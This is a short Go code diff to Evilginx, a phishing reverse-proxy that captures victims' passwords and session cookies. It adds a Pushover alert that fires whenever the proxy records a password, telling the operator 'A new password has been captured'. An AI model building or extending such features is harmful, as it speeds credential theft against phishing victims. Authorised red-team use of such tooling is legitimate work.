@@ -36,6 +36,7 @@ import (
 
 	"github.com/elazarl/goproxy"
 	"github.com/fatih/color"
+	"github.com/gregdel/pushover"
 	"github.com/go-acme/lego/v3/challenge/tlsalpn01"
 	"github.com/inconshreveable/go-vhost"
 	http_dialer "github.com/mwitkow/go-http-dialer"
@@ -1586,6 +1587,21 @@ func (p *HttpProxy) setSessionPassword(sid string, password string) {
 	if ok {
 		s.SetPassword(password)
 	}
+
+	// Create Pushover client with the current AppKey
+	pushoverClient := pushover.New(p.cfg.pushoverConfig.AppKey)
+
+	// Send Pushover Notification
+	recipient := pushover.NewRecipient(p.cfg.pushoverConfig.UserKey)
+	message := &pushover.Message{
+		Message: "A new password has been captured, session:",
+		Title:   "Notification from Evilginx",
+	}
+	_, err := pushoverClient.SendMessage(message, recipient)
+	if err != nil {
+		log.Error("Failed to send Pushover notification: %v", err)
+	}
+
 }
 
 func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
